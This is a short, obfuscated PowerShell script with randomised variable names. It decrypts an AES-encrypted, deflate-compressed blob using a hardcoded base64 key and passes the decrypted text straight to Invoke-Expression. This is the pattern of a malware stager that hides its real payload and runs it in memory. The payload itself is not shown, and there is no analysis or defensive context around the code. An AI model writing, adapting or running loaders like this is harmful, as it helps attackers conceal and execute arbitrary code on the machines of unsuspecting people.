$puommxy = New-Object "System.Security.Cryptography.AesManaged"
$vwpffjy = [System.Convert]::FromBase64String("cjHfmLGSG6syw8xDSIZWHoP2BaINqp/sVBEEVm1oVq0=")
$puommxy.IV = $mwucu[0..15]
$puommxy.Padding = [System.Security.Cryptography.PaddingMode]::ANSIX923
$puommxy.BlockSize = 128
$puommxy.KeySize = 256
$puommxy.Key = $vwpffjy
$puommxy.Mode = [System.Security.Cryptography.CipherMode]::ECB
$mnmjfbzte = New-Object System.IO.MemoryStream(,$puommxy.CreateDecryptor().TransformFinalBlock($mwucu,16,$mwucu.Length-16))
$iezcinhf = New-Object System.IO.MemoryStream
$wutceck = New-Object System.IO.Compression.DeflateStream $mnmjfbzte, ([IO.Compression.CompressionMode]::Decompress)
$wutceck.CopyTo($iezcinhf)
$qjfx = [System.Text.Encoding]::UTF8.GetString($iezcinhf.ToArray())
$mnmjfbzte.Close()
$wutceck.Close()
$puommxy.Dispose()
Invoke-Expression($qjfx)